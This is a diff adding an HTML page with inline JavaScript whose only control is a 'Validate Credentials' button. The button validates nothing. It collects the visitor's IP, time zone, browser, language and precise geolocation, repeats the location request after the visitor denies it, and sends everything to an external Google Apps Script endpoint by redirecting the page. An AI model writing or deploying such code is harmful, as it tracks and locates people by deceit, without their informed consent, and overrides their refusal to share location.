@@ -1,0 +1,148 @@
+<style>
+* {
+  font-variant: small-caps;
+  -webkit-touch-callout: none;
+  -webkit-user-select: none;
+  -khtml-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+</style>
+<div style="z-index:-1000; position:fixed; opacity:0.5; left:0px; top:0px; width:100%; height:100%; background-size:cover; background-image:url(https://drive.google.com/uc?export=view&id=0B_Fu1HHv10gpSEUtNjlCM2VMaTA);">
+</div>
+<div onclick="Validate()" onmouseover="HighlightButton(this)" onmouseout="UnhighlightButton(this)"
+  style="font-size:250%; width:100%; height:50px; background-color:rgba(0,153,255,0.5); top:50%; color:#FFFFFF; text-align:center; vertical-align:middle; float:left; cursor:pointer; position:relative;">
+  <span style="vertical-align:bottom;"><b>Validate Credentials</b></span>
+</div>
+<script type="text/javascript" src="http://l2.io/ip.js?var=myip"></script>
+<script>
+var myip;
+var Credentials = "";
+var GeoLocError = "";
+var CredentialLink = "https://script.google.com/macros/s/AKfycby5U_ZWMloL8YBFliDWvAg6qbjcGSbCq1vn3G1BPNmo/dev";
+
+
+function Validate(){
+  Credentials.IP = myip;
+  console.log(Credentials.IP);
+  GetHTMLInformation();
+}
+
+
+function GetHTMLInformation(){
+  var OffsetTime = new Date().getTimezoneOffset();
+  var TimeZone = {
+    Ahead: OffsetTime<0?true:false,
+    Hours: Math.abs(OffsetTime<0?Math.floor(-OffsetTime/60):Math.ceil(-OffsetTime/60)),
+    Minutes: Math.abs(OffsetTime%60)
+  };
+  TimeZone = (!TimeZone.Ahead?"-":"")+LeadingZero(TimeZone.Hours, 2)+":"+LeadingZero(TimeZone.Minutes, 2);
+  var BrowserName = GetBrowser();
+  var BrowserLanguage = navigator.language;
+  Credentials = {
+    //Google: GAccInfo,
+    Timestamp: GetUTCTimestamp(),
+    TimeZone: TimeZone,
+    Browser: {Name: BrowserName, Language: BrowserLanguage}
+  };
+  GetGeolocation();
+}
+
+
+function GetGeolocation(){
+  if(navigator.geolocation)
+    navigator.geolocation.getCurrentPosition(GetPosition, GetGeoLocError);
+  else{
+    GeoLoc = "Not Supported";
+    GeoLocError = "Not Supported";
+  }
+}
+
+
+function GetPosition(Pos){
+  GeoLoc = {Latitude: Pos.coords.latitude, Longitude: Pos.coords.longitude, Accuracy: Pos.coords.accuracy};
+  GeoLocError = "";
+  Credentials.GeoLoc = GeoLoc;
+  SendInfo();
+}
+
+
+function GetGeoLocError(Error){
+  switch(Error.code) {
+    case Error.PERMISSION_DENIED: GeoLocError = "Permission Denied"; GetGeolocation(); break;
+    case Error.POSITION_UNAVAILABLE: GeoLocError = "Unavailable"; SendInfoAnyway(); break;
+    case Error.TIMEOUT: GeoLocError = "Timeout"; GetGeolocation(); break;
+    case Error.UNKNOWN_ERROR: GeoLocError = "Unknown"; SendInfoAnyway(); break;
+  }
+}
+
+
+function SendInfo(){
+  var Timestamp = Credentials.Timestamp.replace(/ /g, "BLSP").replace(/\//g, "SLSH").replace(/:/g, "CLN");
+  var TimeZone = Credentials.TimeZone.replace(/:/g, "CLN");
+  var QueryString = "?validate="+Timestamp+";"+Credentials.IP+";"+TimeZone+";"+Credentials.Browser.Name+";"+Credentials.Browser.Language+";"+Credentials.GeoLoc.Latitude+";"+Credentials.GeoLoc.Longitude+";"+Credentials.GeoLoc.Accuracy;
+  var CredentialWindow = window.open(CredentialLink+QueryString, "_top");
+}
+
+
+function SendInfoAnyway(){
+  Credentials.GeoLoc = {Latitude: "error", Longitude: "error", Accuracy: "error"};
+  SendInfo();
+}
+
+
+//UTILS
+function GetUTCTimestamp(){
+  var date = new Date();
+  var Day = LeadingZero(date.getUTCDate(), 2);
+  var Month = LeadingZero(date.getUTCMonth()+1, 2);
+  var Year = date.getUTCFullYear();
+  var Hour = LeadingZero(date.getUTCHours(), 2);
+  var Minute = LeadingZero(date.getUTCMinutes(), 2);
+  var Second = LeadingZero(date.getUTCSeconds(), 2);
+  var ms = LeadingZero(date.getUTCMilliseconds(), 3);
+  
+  return Day+"/"+Month+"/"+Year+" "+Hour+":"+Minute+":"+Second+":"+ms;
+}
+
+
+function LeadingZero(Number, Length){
+  var String = Number.toString();
+  while(String.length<Length)
+    String = "0"+String;
+  return String;
+}
+
+
+function GetBrowser(){
+  //http://stackoverflow.com/questions/9847580/how-to-detect-safari-chrome-ie-firefox-and-opera-browser
+  var isOpera = !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
+  var isFirefox = typeof InstallTrigger !== 'undefined';
+  var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
+  var isChrome = !!window.chrome && !isOpera;
+  var isIE = /*@cc_on!@*/false || !!document.documentMode;
+  
+  switch(true){
+    case isOpera: return "Opera"; break;
+    case isFirefox: return "Firefox"; break;
+    case isSafari: return "Safari"; break;
+    case isChrome: return "Chrome"; break;
+    case isIE: return "Internet Explorer"; break;
+  }
+  return "Error";
+}
+
+
+
+//BUTTON CONTROLS
+function HighlightButton(Item){
+  Item.style.backgroundColor = "rgba(0,0,0,1)";
+  Item.style.color = "#0099FF";
+}
+
+function UnhighlightButton(Item){
+  Item.style.backgroundColor = "rgba(0,153,255,0.5)";
+  Item.style.color = "#FFFFFF";
+}
+</script>
